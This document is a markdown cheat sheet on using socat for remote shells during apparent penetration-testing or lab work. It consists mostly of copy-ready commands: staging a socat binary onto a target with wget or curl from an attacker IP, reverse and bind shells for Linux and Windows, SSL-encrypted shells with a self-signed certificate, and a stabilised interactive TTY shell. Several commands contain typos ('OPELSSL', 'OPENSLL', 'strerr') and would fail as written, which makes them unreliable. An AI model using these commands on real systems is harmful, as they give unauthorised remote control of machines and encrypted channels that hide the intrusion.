
get binary https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true

from simpler nc shell:
- upload socat binary to target machine (`python3 -m http.server 8000`)
- `wget 10.18.21.236/socat` or `curl -O http://10.18.21.236/socat` to dl to current dir

socat is used to connect two points together - for example your keyboard/screen and a remote ip+port

mostly useful on linux

---
## Shells

#### Reverse shell - Listener on our machine

listen on our machine: (can be used like `nc -lvnp <port>`, not just for socat connections)
`socat TCP-L:<port> -`

connect with windows target:
`socat TCP:<ip>:<port> EXEC:powershell.exe,pipes`
`pipes` forces use of unix style io

connect with linux target:
`socat TCP:<ip>:<port> EXEC:"bash -li"`

#### Bind shell - listener on target

listen on linux target:
`socat TCP-L:<port> EXEC:"bash -li"`

listen on windows target:
`socat TCP-L:<port> EXEC:powershell,pipes`
`pipes` forces use of unix style io

connect with our machine:
`socat TCP:<ip>:<port> -`

`-` means stdio, standard input output


### Debugging

You can add `-d -d` to a socat command to increase verbosity


## Encrypted shells

#### Create certificate

generate a certificate:
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
`req` request a certificate
`--newkey rsa:2048` generate a 2048 bit RSA key
`-nodes` save private key as plain text
`-keyout shell.key` key filename
`-x509` generate a self-signed cert
`-days 362` set cert validity
`-out shell.crt` cert filename

merge the key and the cert:
`cat shell.key shell.crt > shell.pem`

#### Reverse shell - Listener on our machine

listen on our machine:
`socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -`
`verify=0` don't validate that cert has been signed by recognized authority

connect with linux target:
`socat OPELSSL:<ip>:<port>,verify=0 EXEC:/bin/bash`

#### Bind shell - listener on target

listen on windows target:
`socat OPENSLL-LISTEN:<port>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
`verify=0` don't validate cert has been signed by recognized authority
`pipes` forces use of unix style io

connect with our machine:
`socat OPENSLL:<ip>:<port>,verify=0 -`


## More advanced listener for linux

Requires socat on both machines

listen on our machine:
`socat TCP-L:<port> FILE:'tty',raw,echo=0`
is much more stable and sets echo off

connect with linux target:
`socat TCP:<ip>:<port> EXEC:"bash -li",pty,strerr,sigint,setsid,sane`

#### With encryption

listen on our machine:
`socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 FILE:'tty',raw,echo=0`

connect with linux target:
`socat OPENSSL:<ip>:<port>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`



